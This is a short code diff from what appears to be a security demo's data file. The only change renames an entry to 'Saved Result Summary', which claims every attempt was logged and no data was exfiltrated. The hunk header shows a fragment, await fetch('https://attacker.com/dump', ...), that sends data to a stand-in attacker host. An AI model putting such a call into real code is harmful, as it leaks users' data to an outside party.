@@ -44,7 +44,7 @@ await fetch('https://attacker.com/dump', {
 				ms: 0
 			},
 		{
-			name: 'Trace Summary',
+			name: 'Saved Result Summary',
 			description: 'Every attempt logged, zero data exfiltrated',
 			code: '// Security audit trail',
 			input: { attempts: 2 },
